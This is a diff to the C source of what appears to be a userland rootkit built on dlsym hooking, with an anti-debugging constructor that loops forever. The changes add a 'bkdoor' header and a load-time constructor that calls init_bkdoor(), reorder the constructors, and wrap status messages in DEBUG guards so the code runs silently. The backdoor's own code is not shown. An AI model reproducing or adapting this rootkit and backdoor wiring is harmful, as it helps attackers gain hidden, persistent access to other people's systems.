@@ -12,6 +12,7 @@
 #include "include/config.h"
 #include "include/common.h"
 #include "include/dlsym.h"
+#include "include/bkdoor.h"
 #include "include/misc.h"
 
 extern char **environ;
@@ -35,8 +36,9 @@ static int rk_exec(const char *file, const char *cmd)
 int main(void)
 {
     int fd, uid, orig_uid, orig_gid;
-
+#ifdef DEBUG
     printf("Normal Operation!\r\n");
+#endif
 
     orig_uid = getuid();
     orig_gid = getgid();
@@ -66,15 +68,7 @@ int main(void)
     return 0;
 }
 
-__attribute__((constructor (101))) void init(void)
-{
-    libc = dlopen(LIBC_PATH, RTLD_LAZY);
-
-    if(!real_dlsym)
-        find_dlsym();
-}
-
-__attribute__((constructor (102))) void anti_tricks(void)
+__attribute__((constructor (101))) void anti_tricks(void)
 {
     int i;
     volatile int pt_offset = 0;
@@ -133,4 +127,21 @@ __attribute__((constructor (102))) void anti_tricks(void)
             ");
         } while(1);
     }
+}
+
+__attribute__((constructor (102))) void init(void)
+{
+    libc = dlopen(LIBC_PATH, RTLD_LAZY);
+
+    if(!real_dlsym)
+        find_dlsym();
+
+    if(init_bkdoor() < 0)
+    {
+#ifdef DEBUG
+        printf("Failed initiating backdoor!\r\n");
+#endif
+    }
+
+
 }
